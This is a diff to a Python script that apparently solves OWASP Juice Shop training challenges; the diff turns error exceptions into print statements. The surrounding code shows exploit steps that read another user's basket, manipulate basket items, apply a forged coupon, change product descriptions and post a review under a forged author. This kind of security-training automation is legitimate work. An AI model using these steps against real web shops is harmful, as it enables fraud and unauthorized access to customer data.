@@ -18,7 +18,7 @@ def _build_basket_payload(productid, basketid, quantity):
 def search_products(server, session, searchterm=''):
     search = session.get('{}/rest/products/search?q={}'.format(server, searchterm))
     if not search.ok:
-        raise RuntimeError('Error searching products: {}'.format(search.reason))
+        print('Error searching products: {}'.format(search.reason))
     return search.json().get('data')
 
 
@@ -36,7 +36,7 @@ def access_another_user_basket(server, session):
         targetid = myid - 1
     basket = session.get('{}/{}'.format(_get_basket_url(server), targetid))
     if not basket.ok:
-        raise RuntimeError('Error accessing basket {}'.format(targetid))
+        print('Error accessing basket {}'.format(targetid))
     else:
         print('Success.')
 
@@ -69,7 +69,7 @@ def make_ourselves_rich(server, session):
     basketurl = '{}/api/BasketItems/1'.format(server)
     additem = session.put(basketurl, data=payload)
     if not additem.ok:
-        raise RuntimeError('Error adding items to basket.')
+        print('Error adding items to basket.')
     else:
       print('Success.')
     _checkout(server, session, basketid)
@@ -112,7 +112,7 @@ def forge_coupon(server):
     print('Applying forged coupon...'),
     applycoupon = session.put('{}/{}/coupon/{}'.format(_get_basket_url(server), basketid, couponcode))
     if not applycoupon.ok:
-        raise RuntimeError('Error applying coupon code.')
+        print('Error applying coupon code.')
     _checkout(server, session, basketid)
     print('Success.')
 
@@ -129,7 +129,7 @@ def _update_description(server, session, productid, description):
     payload = json.dumps({'description': description})
     update = session.put(apiurl, headers={'Content-Type': 'application/json'}, data=payload)
     if not update.ok:
-        raise RuntimeError('Error updating description for product.')
+        print('Error updating description for product.')
 
 
 def _add_to_basket(server, session, payload):
@@ -143,7 +143,7 @@ def _add_to_basket(server, session, payload):
     additem = session.post(basketurl, data=payload)
     # additem = session.post(basketurl, headers={'Content-Type': 'application/json'}, data=payload)
     if not additem.ok:
-        raise RuntimeError('Error adding items to basket.')
+        print('Error adding items to basket.')
 
 
 def _checkout(server, session, basketid):
@@ -155,7 +155,7 @@ def _checkout(server, session, basketid):
     payload = json.dumps({'couponData':'bnVsbA==','orderDetails':{'paymentId':'3','addressId':'3','deliveryMethodId':'1'}})
     checkout = session.post('{}/{}/checkout'.format(_get_basket_url(server), basketid), payload)
     if not checkout.ok:
-        raise RuntimeError('Error checking out basket.')
+        print('Error checking out basket.')
 
 def _generate_coupon():
     """
@@ -178,7 +178,7 @@ def forged_review_challenge(server, session):
     payload = json.dumps({"message":"This may be the end of the banana daiquiri as we know it!","author":"bender@juice-sh.op"})
     review = session.put('{}/rest/products/6/reviews'.format(server), payload)
     if not review.ok:
-        raise RuntimeError('Error checking out basket.')
+        print('Error checking out basket.')
     print('Success.')
         
 
